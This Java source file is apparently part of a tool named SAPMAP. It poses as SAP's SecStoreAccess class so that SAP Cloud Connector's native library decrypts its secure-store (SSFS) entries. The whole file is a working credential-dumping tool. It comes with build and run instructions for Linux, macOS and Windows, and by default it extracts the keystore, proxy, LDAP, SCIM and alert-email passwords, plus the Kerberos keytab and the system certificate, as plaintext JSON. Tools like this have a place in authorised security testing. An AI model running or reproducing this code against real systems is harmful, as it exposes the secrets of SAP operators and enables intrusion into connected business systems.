// SAPMAP — JNI wrapper that calls libsapscc20jni's getRecord() to decrypt
// SAP Cloud Connector SSFS entries.  Based on the redrays-io PoC:
//   https://github.com/redrays-io/SAP_Cloud_Connector_SSFS_Decryption
//
// The package + class name MUST stay com.sap.scc.jni.SecStoreAccess so the
// JNI symbol Java_com_sap_scc_jni_SecStoreAccess_getRecord exported by the
// SAP-shipped native library resolves.
//
// THIS JAR IS PORTABLE.  Java's System.loadLibrary() picks the right
// platform suffix for you (.so on Linux, .dll on Windows, .dylib on
// macOS), so the same decrypt-ssfs.jar works on all three OSes.  Build
// it ONCE on any host that has a JDK and copy the jar to the host that
// also has libsapscc20jni.{so,dll,dylib} alongside SCC.
//
// Build (Linux / macOS):
//     make                                # or: ./build.sh
// Build (Windows, from cmd.exe):
//     build.bat
//
// Run (Linux):
//     export SAPSYSTEMNAME=<embedded SID>
//     export RSEC_SSFS_DATAPATH=/path/to/dir/holding/SSFS_<SID>.{KEY,DAT}
//     java -Dscc.jni.lib=/opt/sap/scc/lib/libsapscc20jni.so \
//          -jar decrypt-ssfs.jar
//
// Run (macOS — same jar, different lib):
//     export SAPSYSTEMNAME=<embedded SID>
//     export RSEC_SSFS_DATAPATH=/path/to/scc_config
//     java -Dscc.jni.lib=/Applications/sapcc/lib/native/libsapscc20jni.dylib \
//          -jar decrypt-ssfs.jar
//     # The dylib's CPU arch (arm64 vs x86_64) MUST match the JVM you launch.
//
// Run (Windows — same jar, different lib):
//     set SAPSYSTEMNAME=<embedded SID>
//     set RSEC_SSFS_DATAPATH=C:\SAP\scc20\scc_config
//     java "-Dscc.jni.lib=C:\SAP\scc20\lib\native\sapscc20jni.dll" ^
//          -jar decrypt-ssfs.jar
//
// Output is a single-line JSON document mapping each requested SSFS key
// to its plaintext (or null when the SSFS lacks that record).  Pass
// specific keys as CLI args to restrict the dump.
package com.sap.scc.jni;

import java.io.File;
import java.util.LinkedHashMap;
import java.util.Map;

public class SecStoreAccess {

    static synchronized native char[] getRecord(final String p0)
            throws SecStoreAccessException, IllegalArgumentException;

    private static final String[] DEFAULT_KEYS = {
        "CLOUD_CONN/JAVA_KEYSTORE_PASSWORD",
        "CLOUD_CONN/SYSTEM_CERTIFICATE",
        "CLOUD_CONN/PROXY_PASSWORD",
        "CLOUD_CONN/KERBEROS_KTAB",
        "CLOUD_CONN/LDAP_SERVICE_USER_PASSWORD",
        "CLOUD_CONN/SCIM_SERVICE_USER_PASSWD",
        "CLOUD_CONN/ALERT_EMAIL_SERVER_SECRET",
    };

    public static void main(String[] args) {
        loadNative();
        String[] keys = (args.length > 0) ? args : DEFAULT_KEYS;
        Map<String, String> out = new LinkedHashMap<>();
        for (String key : keys) {
            try {
                char[] result = getRecord(key);
                out.put(key, result == null ? null : new String(result));
            } catch (Throwable t) {
                out.put(key, null);
            }
        }
        System.out.println(toJson(out));
    }

    private static void loadNative() {
        // Operator may pass an absolute path via -Dscc.jni.lib=...
        // Otherwise we fall back to the OS-default library name and rely
        // on java.library.path / LD_LIBRARY_PATH / PATH to find it.
        String libProp = System.getProperty("scc.jni.lib");
        if (libProp != null && !libProp.isEmpty()) {
            File f = new File(libProp);
            if (f.exists()) {
                System.load(f.getAbsolutePath());
                return;
            }
        }
        String os = System.getProperty("os.name", "").toLowerCase();
        String defaultName = os.contains("win") ? "sapscc20jni" : "sapscc20jni";
        try {
            System.loadLibrary(defaultName);
        } catch (UnsatisfiedLinkError e) {
            System.err.println("SCC native library not found.  Pass an absolute "
                    + "path via -Dscc.jni.lib=<path-to-libsapscc20jni.so|"
                    + "sapscc20jni.dll> or set java.library.path.");
            System.err.println("Underlying error: " + e.getMessage());
            System.exit(2);
        }
    }

    private static String toJson(Map<String, String> m) {
        StringBuilder sb = new StringBuilder("{");
        boolean first = true;
        for (Map.Entry<String, String> e : m.entrySet()) {
            if (!first) sb.append(',');
            first = false;
            sb.append('"').append(escape(e.getKey())).append('"').append(':');
            if (e.getValue() == null) sb.append("null");
            else sb.append('"').append(escape(e.getValue())).append('"');
        }
        sb.append('}');
        return sb.toString();
    }

    private static String escape(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"':  sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default:
                    if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
                    else sb.append(c);
            }
        }
        return sb.toString();
    }
}
